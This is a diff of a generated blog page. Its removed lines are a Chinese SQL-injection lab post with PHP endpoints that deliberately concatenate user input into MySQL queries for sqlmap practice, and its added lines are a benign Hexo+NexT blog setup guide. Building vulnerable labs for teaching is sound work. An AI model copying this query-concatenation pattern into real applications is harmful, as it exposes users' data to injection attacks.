@@ -323,7 +323,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hmy626.github.io/网络安全实验/网络对抗原理实验一/">
+    <link itemprop="mainEntityOfPage" href="https://hmy626.github.io/教程/Hexo-next搭建博客指南/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Santu">
@@ -342,7 +342,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/网络安全实验/网络对抗原理实验一/" itemprop="url">网络对抗原理实验一</a></h1>
+                <a class="post-title-link" href="/教程/Hexo-next搭建博客指南/" itemprop="url">Hexo+next搭建博客指南</a></h1>
         
 
         <div class="post-meta">
@@ -354,7 +354,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-13T22:09:22+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-13T14:43:03+08:00">
                 2019-01-13
               </time>
             
@@ -370,7 +370,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-01-13T22:46:55+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-01-13T17:03:09+08:00">
                 2019-01-13
               </time>
             
@@ -389,8 +389,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全实验/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全实验</span>
+                  <a href="/categories/教程/" itemprop="url" rel="index">
+                    <span itemprop="name">教程</span>
                   </a>
                 </span>
 
@@ -420,7 +420,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  5.5k
+                  3.1k
                 </span>
               
 
@@ -436,7 +436,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  25
+                  14
                 </span>
               
             </div>
@@ -459,420 +459,275 @@
       
         
           
-            <h1 id="网络对抗原理实验一"><a href="#网络对抗原理实验一" class="headerlink" title="网络对抗原理实验一"></a>网络对抗原理实验一</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol>
-<li>搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。</li>
-<li>搭建运用的运行环境，如nginx+php-fpm、tomcat+java等等。</li>
-<li>编写带有sql注入漏洞的接口程序，包含:<ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果展示。如根据输入的学号展示姓名<br>和分数。</li>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果是否为空。如输入学号，展示是<br>否有该学生存在。</li>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果是否为空展示在两段随机内容之间。</li>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果的条件表达式结果，并将结果展<br>示在两段随机内容之间。如入学号，展示该学生分数是否大于 60。</li>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，但展示一个固定的结果。如输入学号，查询<br>是否有学生存在，然后输出固定内容。</li>
-<li>据输入的参数值，拼接 SQL 语句并执行，更新数据库。如输入学号和分数，将对应学生的分数<br>更新。</li>
+            <h1 id="Hexo-next搭建博客指南"><a href="#Hexo-next搭建博客指南" class="headerlink" title="Hexo+next搭建博客指南"></a>Hexo+next搭建博客指南</h1><p>我以前用的博客系统是wordpress，虽然搭起来比较方便，但是权限少，个人觉得wordpress博客系统架构有点混乱。听了<a href="https://blog.xieldy.cn/" target="_blank" rel="noopener">@Xieldy</a>和<a href="https://barriery.cn/" target="_blank" rel="noopener">@barriery</a>的建议，开始尝试Hexo系统，发现这个博客系统还基于Flask架构来写的, 我在菊厂实习的时候刚好用flask开发过后台，所以对这个架构比较熟悉。现在来分享一下自己建站的经历（踩的坑）。</p>
+<p>我云主机的系统是Ubuntu16.04</p>
+<ul>
+<li>首先安装nodejs</li>
 </ul>
+<p>一开始我使用的apt源安装，但是Ubuntu源中的nodejs时旧版本，用apt源安装会导致hexo命令异常，所以需要在安装后更新nodejs。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt install nodejs-legacy</span><br><span class="line">sudo apt install npm</span><br></pre></td></tr></table></figure>
+<ul>
+<li>更换成淘宝的镜像，否则非常慢</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>可以通过 <code>sudo npm config list</code> 查看是否生效</p>
 </li>
-<li>针对上述各个应用接口，手工修改请求参数，尝试各种 SQL 注入的攻击向量，和正常访问的对照组一 起，观察结果并记录。</li>
-<li>针对上述各个应用接口，用 sqlmap 尝试各种注入方式，并用 wireshark 抓包，记录每次的目标、 SQL 命令行、结果(包括出结果的过程、和最终的输出)、和抓包文件。</li>
-<li>分析抓包文件，了解攻击向量，体会各种注入技术的原理。并回到 4 步骤中手动尝试。</li>
-<li>在步骤3中第一个接口的基础上，尝试用不同的方法来避免SQL注入，再使用sqlmap尝试看是否有效，能否绕过。</li>
-</ol>
-<h2 id="实验环境：Ubuntu-16-04"><a href="#实验环境：Ubuntu-16-04" class="headerlink" title="实验环境：Ubuntu 16.04"></a>实验环境：Ubuntu 16.04</h2><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。"><a href="#搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。" class="headerlink" title="搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。"></a>搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。</h3><blockquote>
-<p>进入数据库并且输入密码</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>创建数据库</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (<span class="keyword">id</span>,<span class="keyword">name</span>,score) <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">'Tom'</span>, <span class="number">95</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (<span class="keyword">id</span>,<span class="keyword">name</span>,score) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">'Jack'</span>, <span class="number">80</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (<span class="keyword">id</span>,<span class="keyword">name</span>,score) <span class="keyword">values</span> (<span class="number">3</span>, <span class="string">'Mary'</span>, <span class="number">65</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (<span class="keyword">id</span>,<span class="keyword">name</span>,score) <span class="keyword">values</span> (<span class="number">4</span>, <span class="string">'John'</span>, <span class="number">55</span>);</span><br></pre></td></tr></table></figure>
-<h3 id="搭建运用的运行环境-nginx-php-fpm"><a href="#搭建运用的运行环境-nginx-php-fpm" class="headerlink" title="搭建运用的运行环境:nginx+php-fpm"></a>搭建运用的运行环境:nginx+php-fpm</h3><ul>
-<li>在线安装Nginx</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure>
-<p>安装成功之后，nginx放置在/etc/nginx目录下，并且已经在/etc/init.d/下创建了启动脚本；启动程序文件在/usr/sbin/nginx；日志文件放置在/var/log/nginx目录下，分别是access.log和error.log<br>虚拟主机配置文件放置在/etc/nginx/sites-available目录下；默认的虚拟主机的目录/usr/share/nginx/www。</p>
-<ul>
-<li>启动Nginx</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php7.0-fpm</span><br></pre></td></tr></table></figure>
-<p>在这里，我们使用php-fpm使得PHP7.0可以在nginx上通过PHP-FPM工作，PHP-FPM（FastCGI Process Manager) 是一个守护进程（init脚本文件在/etc/init.d/php7.0-fpm)，它运行了一个FastCGI server，端口是 9000。</p>
-<ul>
-<li>配置Nginx</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/1.png" alt=""></p>
-<p>将配置文件中将第39行添加index.htm和index.php使.htm文件和php文件可以成为文件夹默认打开文件，并且反注释57行进行9000端口监听。</p>
-<ul>
-<li>reload使配置生效</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service nginx restart</span><br></pre></td></tr></table></figure>
-<ul>
-<li>测试<blockquote>
-<p>在网站根目录创建一个PHP的测试文件</p>
-</blockquote>
+<li><p>安装更新版本的工具N</p>
 </li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /var/www/html/info.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install n -g</span><br></pre></td></tr></table></figure>
+<ul>
+<li>更新版本</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo n stable</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>可以看到有 installed：版号，说明更新成功</p>
+</li>
+<li><p>安装hexo</p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install -g hexo</span><br></pre></td></tr></table></figure>
+<ul>
+<li>选一个空目录创建根目录模版</li>
+</ul>
+<p>我选择的是<code>/var/www/html/</code>目录下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hexo init</span><br></pre></td></tr></table></figure>
+<ul>
+<li>下载next主题模版</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next.git themes/next</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在根目录_config.yml文件中启用next主题</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>php文件内容</p>
-</blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/2.png" alt=""></p>
-<blockquote>
-<p>打开浏览器输入<a href="http://127.0.0.1/info.php" target="_blank" rel="noopener">http://127.0.0.1/info.php</a></p>
-</blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/3.png" alt="coin"></p>
-<blockquote>
-<p>至此nginx已经配置成功</p>
+<p>PS: 所有配置文件内，每一项配置的冒号后面都要加上空格</p>
 </blockquote>
 <ul>
-<li>配置php-fpm</li>
+<li>设置语言</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php7.0-mysql php7.0-curl php7.0-gd php7.0-intl php-pear php7.0-imagick php7.0-imap php7.0-mcrypt php7.0-memcache php7.0-ming php7.0-ps php7.0-pspell php7.0-recode php7.0-snmp php7.0-sqlite php7.0-tidy php7.0-xmlrpc php7.0-xsl</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>重启PHP-FPM，使之生效</p>
-</blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service php7.0-fpm restart</span><br></pre></td></tr></table></figure>
-<h3 id="编写带有sql注入漏洞的接口程序"><a href="#编写带有sql注入漏洞的接口程序" class="headerlink" title="编写带有sql注入漏洞的接口程序"></a>编写带有sql注入漏洞的接口程序</h3><blockquote>
-<p>以下代码中数据库密码[<strong>**</strong>]已作脱敏处理，应换成你的mysql root密码</p>
-</blockquote>
+<p>在根目录_config.yml文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果展示。如根据输入的学号展示姓名和分数。</li>
+<li>主题选择</li>
 </ul>
-<p>html文件如下</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./1.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/a.png" alt="coin"></p>
-<p>php文件如下所示</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'&#123;********&#125;'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con,<span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con,<span class="string">"SELECT name,score FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result[<span class="string">"name"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"score:"</span>.$result[<span class="string">"score"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/b.png" alt="coin"></p>
+<p>在<strong>主题</strong>配置文件中，查找scheme, 选择你喜欢的主题对其反注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 主题中的主题</span><br><span class="line"># scheme: Muse</span><br><span class="line">scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果是否为空。如输入学号，展示是否有该学生存在。</li>
+<li>背景设置</li>
 </ul>
-<p>html文件如下所示</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./2.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/c.png" alt="coin"></p>
-<p>php文件如下所示</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'&#123;********&#125;'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con, <span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="comment">//echo "username:".$result["username"]."&lt;br/&gt;";</span></span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">if</span>($i==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"yes"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/d.png" alt="coin"></p>
+<p>在主题配置文件中，查找canvas：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Canvas-nest</span><br><span class="line">canvas_nest: false</span><br><span class="line"># three_waves</span><br><span class="line">three_waves: false</span><br><span class="line"># canvas_lines</span><br><span class="line">canvas_lines: false</span><br><span class="line"># canvas_sphere</span><br><span class="line">canvas_sphere: false</span><br><span class="line"># Only fit scheme Pisces</span><br><span class="line"># Canvas-ribbon</span><br><span class="line">canvas_ribbon: true</span><br></pre></td></tr></table></figure>
+<p>开启相应的背景，只要把对应的false设置为true，记得把其他都改为false</p>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果是否为空展示在两段随机内容之间。</li>
+<li>修改内容区域宽度</li>
 </ul>
-<p>html文件代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./3.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/e.png" alt="coin"></p>
-<p>php文件代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_rand</span><span class="params">($length = <span class="number">5</span>, $char = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_int($length) || $length &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $string = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = $length; $i &gt; <span class="number">0</span>; $i--) &#123;</span><br><span class="line">        $string .= $char[mt_rand(<span class="number">0</span>, strlen($char) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'[********]'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con, <span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="comment">//echo "username:".$result["username"]."&lt;br/&gt;";</span></span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">if</span>($i==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> str_rand() . <span class="string">"yes"</span> . str_rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> str_rand() . <span class="string">"no"</span> . str_rand();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/f.png" alt="coin"></p>
+<p>Next 对内容的宽度的设定如下：</p>
+<p>700px，当屏幕宽度 &lt; 1600px</p>
+<p>900px，当屏幕宽度 &gt;= 1600px</p>
+<p>移动设备下，宽度自适应</p>
+<p>在主题目录下的 <code>source/css_variables/custom.styl</code> 文件，新增变量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 修改成你期望的宽度</span><br><span class="line">$content-desktop = 700px</span><br><span class="line">// 当视窗超过 1600px 后的宽度</span><br><span class="line">$content-desktop-large = 900px</span><br></pre></td></tr></table></figure>
